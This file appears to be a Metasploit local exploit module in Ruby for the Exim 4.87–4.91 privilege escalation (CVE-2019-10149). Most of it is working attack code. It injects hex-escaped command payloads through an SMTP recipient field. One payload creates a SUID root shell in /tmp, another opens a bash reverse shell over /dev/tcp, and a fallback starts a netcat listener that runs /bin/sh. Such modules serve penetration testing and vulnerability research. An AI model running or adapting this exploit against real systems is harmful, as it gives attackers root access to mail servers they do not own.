##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Local
  Rank = ExcellentRanking

  include Msf::Post::File
  include Msf::Post::Linux::Priv
  include Msf::Exploit::FileDropper

  def initialize(info = {})
    super(update_info(info,
                      'Name'           => 'Exim 4.87 - 4.91 Privilege Escalation',
                      'Description'    => %q{},
                      'License'        => MSF_LICENSE,
                      'Author'         =>
    [
      'Marco Ivaldi', # Working exploit
      'Guillaume Andre' # Metasploit module
    ],
    'DisclosureDate' => '2019-06-05',
    'Platform'       => [ 'linux' ],
    'Arch'           => [ ARCH_X86, ARCH_X64 ],
    'SessionTypes'   => [ 'shell', 'meterpreter' ],
    'Targets'        =>
    [
      ['Exim 4.87 - 4.91',
       lower_version: Gem::Version.new('4.87'),
       upper_version: Gem::Version.new('4.91')
    ]
    ],
    'References'     =>
    [
      [ 'CVE', '2019-10149' ],
    ]
                     ))
    register_advanced_options [
    ]

    @SUID_SHELL = '/tmp/suid_shell'
    @PAYLOAD_SETUID = '${run{\x2fbin\x2fsh\t-c\t\x22chown\troot\t\x2ftmp\x2fsuid_shell\x3bchmod\t4755\t\x2ftmp\x2fsuid_shell\x22}}@localhost'
    @PAYLOAD_BASH = '${run{\x2fbin\x2fsh\t-c\t\x22bash\t-i\t\x3e\x26\t\x2fdev\x2ftcp\x2f127.0.0.1\x2f13371\t0\x3e\x261\x22}}@localhost'
  end

  def check
    res = cmd_exec 'exim -bV'
    if res =~ /Exim version ([0-9\.]*) /i # Maybe improve the regex
      version = Gem::Version.new($1)
      if version >= target[:lower_version] && version <= target[:upper_version]
        return CheckCode::Appears
      else
        return CheckCode::Safe
      end
      CheckCode::Unknown
    end
  end

  def inject_payload(payload)
    res = cmd_exec('exec 3<>/dev/tcp/localhost/25')

    cmd_exec('read -u 3 && echo $REPLY')
    cmd_exec('echo "helo localhost" >&3')
    cmd_exec('read -u 3 && echo $REPLY')
    cmd_exec('echo "mail from:<>" >&3')
    cmd_exec('read -u 3 && echo $REPLY')
    cmd_exec("echo 'rcpt to:<#{payload}>' >&3")
    cmd_exec('read -u 3 && echo $REPLY')
    cmd_exec('echo "data" >&3')
    cmd_exec('read -u 3 && echo $REPLY')
    for i in (1..31)
      cmd_exec("echo 'Received: #{i}' >&3")
    end
    cmd_exec('echo "." >&3')
    cmd_exec('read -u 3 && echo $REPLY')
    cmd_exec('echo "quit" >&3')
    cmd_exec('read -u 3 && echo $REPLY')
    cmd_exec('exec 3<&-')

    print_status('Payload sent, wait a few seconds...')
    sleep(5)
  end

  def exploit
    print_status('Trying setuid method to escalate privileges')
    shell_c_code = %|
          #include <unistd.h>
          #include <sys/types.h>

          int main() {
            setuid(0);
            setgid(0);
            execve("/bin/bash", NULL, NULL);
            return 0;
          }
    |

    write_file("#{@SUID_SHELL}.c", shell_c_code)
    #register_files_for_cleanup("#{@SUID_SHELL}.c")
    cmd_exec("gcc -o #{@SUID_SHELL} #{@SUID_SHELL}.c 2>&1")
    #register_files_for_cleanup(@SUID_SHELL)
    #inject_payload(@PAYLOAD_SETUID)
    #cmd_exec(@SUID_SHELL)

    if is_root?
      print_good('You are now root, enjoy!')
      return
    end

    print_status('Couldn\'t escalate privileges, trying netcat method')

    # If nc does not have the -e option, try with nc.traditional
    netcat = ''
    if !(cmd_exec('which nc') =~ /no nc/) && !(cmd_exec('nc -e 2>&1') =~ /invalid option/)
      netcat = 'nc'
    elsif !(cmd_exec('which nc.traditional') =~ /no nc.traditional/)
      netcat = 'nc.traditional'
    end

    # If neither nc or nc.traditional can be used, try with bash
    if netcat == ''
      print_error('Neither nc nor nc.traditional could be used')
      return
    end

    inject_payload('${run{\x2fbin\x2fsh\t-c\t\x22' + netcat + '\t-lp\t13371\t-e\t\x2fbin\x2fsh\x22}}@localhost')
    cmd_exec("nc 127.0.0.1 13371")

    if is_root?
      print_good('You are now root, enjoy!')
      return
    else
      print_error('Couldn\'t escalate privileges...')
    end
  end
end
